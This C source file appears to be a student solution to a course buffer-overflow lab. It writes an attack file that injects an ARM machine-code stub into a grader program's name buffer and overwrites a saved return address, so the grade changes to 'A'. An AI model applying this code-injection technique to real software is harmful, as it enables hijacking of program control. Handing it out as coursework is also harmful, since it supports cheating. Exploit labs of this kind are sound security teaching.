
/* Ben Zhou and Owen Clarke*/

#include <stdio.h>
#include "miniassembler.h"
#include <string.h>

int main(void)
{
    FILE           *f;
    unsigned long   pc;
    unsigned int    instr;
    int             i;

    /* These constants come from the grader’s map: */
    const unsigned long NAME_ADDR   = 0x420058UL;  /* start of name[] in BSS */
    const unsigned long GRADE_ADDR  = 0x420044UL;  /* &grade global ('D') */
    const unsigned long PRINT_ADDR  = 0x40089cUL;  /* skip-B, print-grade code */

    /* 1) Open the attack file for binary write */
    f = fopen("dataA", "wb");
    fprintf(f, "%s", "Ben Zhou and Owen Clarke");
    
    for (i = 0; i < 3; i++) { 
        fprintf(f, "%c", '\0'); 
    }



    /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
    pc = NAME_ADDR;  /* at runtime, the stub’s first instr is at NAME_ADDR */

    /* a) ADR  X0, GRADE_ADDR(PC)   ; X0 ← &grade       */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc + 28);
    fwrite(&instr, 4, 1, f);  

    /* b) MOV  W1, #'A'             ; W1 ← ASCII 'A'   */
    instr = MiniAssembler_mov(1, (int)'A');
    fwrite(&instr, 4, 1, f);  

    /* c) STRB W1, [X0]             ; *(&grade) = 'A'  */
    instr = MiniAssembler_strb(1, 0);
    fwrite(&instr, 4, 1, f); 

    /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
    instr = MiniAssembler_b(PRINT_ADDR, pc + 40);
    fwrite(&instr, 4, 1, f);  

    /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
    for (i = 0; i < 8; i++) {
        instr = MiniAssembler_mov(0, 0);
        fwrite(&instr, 4, 1, f);
    }





    /* 3) Overwrite readString’s saved x30 with NAME_ADDR
        so that when readString does `ret`, it jumps into our stub. */
    fwrite(&NAME_ADDR, sizeof(NAME_ADDR), 1, f);

    fclose(f);
    return 0;
}